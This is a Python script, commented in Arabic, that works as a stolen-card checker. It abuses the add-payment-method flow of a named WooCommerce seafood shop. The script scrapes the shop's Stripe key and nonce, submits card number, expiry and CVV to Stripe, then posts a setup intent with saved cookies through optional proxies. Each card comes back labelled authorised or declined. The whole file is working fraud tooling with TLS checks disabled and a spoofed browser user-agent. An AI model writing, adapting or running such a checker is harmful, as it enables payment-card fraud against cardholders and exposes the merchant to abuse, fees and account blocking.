"""
بوابة الدفع: Stripe Auth Single
الموقع: www.mistyharbourseafood.com
نوع البوابة: Stripe Auth Single (WooCommerce Payments)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج publishableKey و createSetupIntentNonce
2. POST https://api.stripe.com/v1/payment_methods -> الحصول على pm_id
3. POST /wp-admin/admin-ajax.php (action=create_setup_intent) -> النتيجة النهائية
"""
import aiohttp
import asyncio
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الخطوة 1: جلب publishableKey و createSetupIntentNonce."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    try:
        async with session.get(
            "https://www.mistyharbourseafood.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text_1 = await r.text()

        pk_match = re.search(r'"publishableKey":"(.*?)"', text_1)
        nonce_match = re.search(r'"createSetupIntentNonce":"(.*?)"', text_1)

        if not pk_match or not nonce_match:
            raise RuntimeError("Failed to fetch gateway tokens from page")

        return pk_match.group(1), nonce_match.group(1)
    except Exception as e:
        raise RuntimeError(f"req1_get_tokens failed: {e}") from e


async def req2_create_payment_method(
    session: aiohttp.ClientSession,
    pk: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إنشاء Payment Method عبر Stripe API."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
    }
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "key": pk,
    }
    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        pm_id = res.get("id")
        if not pm_id:
            error_msg = res.get("error", {}).get("message", "Payment method creation failed")
            raise RuntimeError(error_msg)
        return pm_id
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_create_payment_method failed: {e}") from e


async def req3_create_setup_intent(
    session: aiohttp.ClientSession,
    pm_id: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: إنشاء Setup Intent والحصول على النتيجة النهائية."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "action": "create_setup_intent",
        "payment_method": pm_id,
        "nonce": nonce,
    }
    try:
        async with session.post(
            "https://www.mistyharbourseafood.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req3_create_setup_intent failed: {e}") from e


async def process_ST_single(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Auth Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("ST-3Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            pk, nonce = await req1_get_tokens(session, proxy_url)
            pm_id = await req2_create_payment_method(session, pk, cc, mes, ano, cvv, proxy_url)
            text_3 = await req3_create_setup_intent(session, pm_id, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "succeeded" in text_3.lower() or '"success":true' in text_3.lower():
        return f"𝐀𝐮𝐭𝐡 ✅ | {cc}|{mes}|{ano}|{cvv}", "Succeeded"
    else:
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
